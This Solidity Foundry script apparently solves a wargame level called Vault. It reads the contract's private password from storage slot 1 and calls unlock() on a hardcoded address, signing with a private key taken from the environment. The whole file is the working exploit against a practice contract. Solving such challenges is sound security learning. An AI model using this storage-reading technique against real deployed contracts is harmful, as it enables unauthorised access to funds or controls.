// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/08-Vault.sol";



contract Exp is Script {

    Vault public VaultInstance = Vault(payable(0x4ab4Ecd5156A68a79611b07610C229d1dEd59614));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");


    function run() external {
        vm.startBroadcast(hacker);
 
        bytes32 password = vm.load(address(VaultInstance), bytes32(uint256(1)));
        //cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        //emit log_bytes(abi.encodePacked(password)); 
        //console.log("Password: ", VaultInstance.unlock(password));
        VaultInstance.unlock(password);

        vm.stopBroadcast();
    }
}